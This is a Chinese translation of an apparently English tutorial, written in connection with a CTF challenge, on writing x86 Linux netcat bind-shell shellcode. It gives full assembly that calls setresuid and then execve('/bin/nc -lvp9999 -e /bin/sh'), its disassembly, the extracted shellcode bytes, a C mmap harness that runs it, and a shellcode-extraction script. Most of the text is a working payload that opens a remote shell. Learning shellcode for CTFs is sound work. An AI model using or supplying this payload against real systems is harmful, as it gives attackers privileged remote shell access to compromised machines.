现在使用汇编语言编写程序
    root@MINDZSEC:~# nano ntcat.asm
    jmp short todo
    shellcode:
    ;from man setresuid: setresuid(uid_t ruid, uid_t euid, uid_t suid)
    xor eax, eax ;Zero out eax
    xor ebx, ebx;Zero out ebx
    xor ecx, ecx;Zero out ecx
    cdq;Zero out edx using the sign bit from eax
    mov BYTE al, 0xa4 ;setresuid syscall 164 (0xa4)
    int 0x80;syscall execute
    pop esi;esi contain the string in db
    xor eax, eax;Zero out eax
    mov[esi + 7], al;null terminate /bin/nc
    mov[esi +  16], al ;null terminate -lvp90
    mov[esi +  26], al;null terminate -e/bin/sh
    mov[esi +  27], esi;store address of /bin/nc in AAAA
    lea ebx, [esi + 8];load address of -lvp90 into ebx
    mov[esi +31], ebx;store address of -lvp90 in BBB taken from ebx
    lea ebx, [esi + 17];load address of -e/bin/sh into  ebx
    mov[esi + 35], ebx;store address of -e/bin/sh in CCCC taken from ebx
    mov[esi + 39], eax ;Zero out DDDD
    mov al, 11;11 is execve  syscakk number
    mov ebx, esi;store address of  /bin/nc 
    lea ecx, [esi + 27];load address of ptr to argv[] array
    lea edx, [esi + 39] ;envp[] NULL
    int 0x80;syscall execute 
    todo:
    call shellcode
    db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
    ;   01234567890123456789012345678901234567890123
在这段代码中我们做了以下操作：
1\. 使用xor指令去清零eax，ebx，ecx等寄存器
2\. 将命令写到了shellcode代码中了，即：
    db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
    ;   01234567890123456789012345678901234567890123
3\. 在命令下面还使用了数字进行位置的注释
接下来使用nasm编译这段代码
    root@MINDZSEC:~# nasm -f elf ntcat.asm
然后再用objdump反汇编
    root@MINDZSEC:~# objdump -d ntcat.o
得到
    ntcat.o:     file format elf32-i386
    Disassembly of section .text:
    00000000 :
    0:eb 35                jmp    37 
    00000002 :
    2:31 c0                xor    %eax,%eax
    4:31 db                xor    %ebx,%ebx
    6:31 c9                xor    %ecx,%ecx
    8:99                   cltd   
    9:b0 a4                mov    $0xa4,%al
    b:cd 80                int    $0x80
    d:5e                   pop    %esi
    e:31 c0                xor    %eax,%eax
    10:88 46 07             mov    %al,0x7(%esi)
    13:88 46 10             mov    %al,0x10(%esi)
    16:88 46 1a             mov    %al,0x1a(%esi)
    19:89 76 1b             mov    %esi,0x1b(%esi)
    1c:8d 5e 08             lea    0x8(%esi),%ebx
    1f:89 5e 1f             mov    %ebx,0x1f(%esi)
    22:8d 5e 11             lea    0x11(%esi),%ebx
    25:89 5e 23             mov    %ebx,0x23(%esi)
    28:89 46 27             mov    %eax,0x27(%esi)
    2b:b0 0b                mov    $0xb,%al
    2d:89 f3                mov    %esi,%ebx
    2f:8d 4e 1b             lea    0x1b(%esi),%ecx
    32:8d 56 27             lea    0x27(%esi),%edx
    35:cd 80                int    $0x80
    00000037 :
    37:e8 c6 ff ff ff       call   2 
    3c:2f                   das    
    3d:62 69 6e             bound  %ebp,0x6e(%ecx)
    40:2f                   das    
    41:6e                   outsb  %ds:(%esi),(%dx)
    42:63 23                arpl   %sp,(%ebx)
    44:2d 6c 76 70 39       sub    $0x3970766c,%eax
    49:39 39                cmp    %edi,(%ecx)
    4b:39 23                cmp    %esp,(%ebx)
    4d:2d 65 2f 62 69       sub    $0x69622f65,%eax
    52:6e                   outsb  %ds:(%esi),(%dx)
    53:2f                   das    
    54:73 68                jae    be 
    56:23 41 41             and    0x41(%ecx),%eax
    59:41                   inc    %ecx
    5a:41                   inc    %ecx
    5b:42                   inc    %edx
    5c:42                   inc    %edx
    5d:42                   inc    %edx
    5e:42                   inc    %edx
    5f:43                   inc    %ebx
    60:43                   inc    %ebx
    61:43                   inc    %ebx
    62:43                   inc    %ebx
    63:44                   inc    %esp
    64:44                   inc    %esp
    65:44                   inc    %esp
    66:44                   inc    %esp
接下来我并没有对运行这段代码进行测试，因为我百分之百肯定这段代码是可以运行的。
提取这段代码
    root@MINDZSEC:~# ./xxd-shellcode.sh ntcat.o
得到shellcode
    "xebx35x31xc0x31xdbx31xc9x99xb0xa4xcdx80x5ex31xc0x88x46x07x88x46x10x88x46x1ax89x76x1bx8dx5ex08x89x5ex1fx8dx5ex11x89x5ex23x89x46x27xb0x0bx89xf3x8dx4ex1bx8dx56x27xcdx80xe8xc6xffxffxffx2fx62x69x6ex2fx6ex63x23x2dx6cx76x70x39x39x39x39x23x2dx65x2fx62x69x6ex2fx73x68x23x41x41x41x41x42x42x42x42x43x43x43x43x44x44x44x44"
现在得到了shellcode，接下来要做的工作就是把这段代码放到mman.c测试程序中去运行了。放到mman.c中的程序最终如下:
    root@MINDZSEC:~# nano Mmap.c
    #include 
    #include 
    #include 
    #include 
    #include 
    int (*shellcodetotest)();
    char shellcode[] = "xebx35x31xc0x31xdbx31xc9x99xb0xa4xcdx80x5ex31xc0x88x46x07x88x46x10x88x46x1ax89x76x1bx8dx5ex08x89x5ex1fx8dx5ex11x89x5ex23x89x46x27xb0x0bx89xf3x8dx4ex1bx8dx56x27xcdx80xe8xc6xffxffxffx2fx62x69x6ex2fx6ex63x23x2dx6cx76x70x39x39x39x39x23x2dx65x2fx62x69x6ex2fx73x68x23x41x41x41x41x42x42x42x42x43x43x43x43x44x44x44x44";
    int main(int argc, char **argv) {
    void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if(ptr == MAP_FAILED){
    perror("mmap");
    exit(-1);
    }
    memcpy(ptr, shellcode, sizeof(shellcode));
    shellcodetotest = ptr;
    shellcodetotest();
    return 0;
    }
编译这段代码
    root@MINDZSEC:~# gcc Mmap.c -o Mmap
运行
    oot@MINDZSEC:~# ./Mmap
    listening on [any] 9999 ...
（亲测有效）
可以看到程序在监听9999端口，是因为在ntcat.asm程序中使用的就是9999端口，这段汇编代码也是比较容易看懂的。当然，也还有很多方法来优化这段代码，我的技术只能到这个水平了而已，在这篇文章的基础上继续改进可以节省你很多时间。
要做netcat shellcode，仔细的阅读这篇文章，然后找到自己遇到困难的地方。在后面也会给出email以便大家遇见问题可以联系我。
整个过程中都没使用gdb是因为我认为看这篇文章的人都能够明白这整个代码。
在后面我使用了一个“xxd-shellcode.sh”文件来提取shellcode，它节省了我不少时间（5min）。下面我也把它给出来：
    #!/bin/bash
    filename=`echo $1 | sed s/".o$"//`
    rm -f $filename.shellcode
    objdump -d $filename.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr 't' ' ' | sed 's/ $//g' | sed 's/ /\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
    echo
可以测试下这个文件，当然，里面的东西是不可以修改的。这个文件你也可以在projectshellcode.com里看到。
我的昵称是MINDZSEC，我喜欢SHELLCODE。
**小结**
其实这篇文章在湖湘杯线下赛一题中可以用到的。当时湖湘杯线下赛的时候不能联网。知道问题在哪，但不晓得怎么用，试来试去都没搞出来，很蛋疼，最后都没做出来。回来以后google了一把找到了这篇文章，才把题搞出来了。歪果人还是蛮厉害的，服。不过也是自己弱，还是继续努力吧，也把它翻译出来，希望有兴趣的同学大家一起学习。最后把原文链接贴出来，翻译水平有点烂，大家有兴趣去看原文吧。